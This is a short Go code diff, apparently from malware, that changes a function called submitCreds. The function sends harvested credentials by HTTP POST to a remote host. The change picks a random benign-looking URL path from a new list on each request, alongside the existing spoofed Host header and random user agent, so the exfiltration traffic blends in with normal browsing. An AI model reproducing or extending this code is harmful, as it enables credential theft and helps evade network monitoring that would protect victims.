@@ -26,7 +26,7 @@ func submitCreds(host string, creds Creds) error {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", host+"/v1/services", bytes.NewBuffer([]byte(payloadJson)))
+	request, err := http.NewRequest("POST", host+randEntry(domenaPostServiceMap), bytes.NewBuffer([]byte(payloadJson)))
 	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
@@ -44,4 +44,19 @@ func submitCreds(host string, creds Creds) error {
 	defer response.Body.Close()
 
 	return nil
+}
+
+// Xena-Service-Domena POST /v1/services
+var domenaPostServiceMap = []string{
+	"/v1/services",
+	"/wp-content",
+	"/en-us",
+	"/quote",
+	"/channel",
+	"/channel/profile",
+	"/article",
+	"/article/data",
+	"/wiki",
+	"/category",
+	"/music",
 }
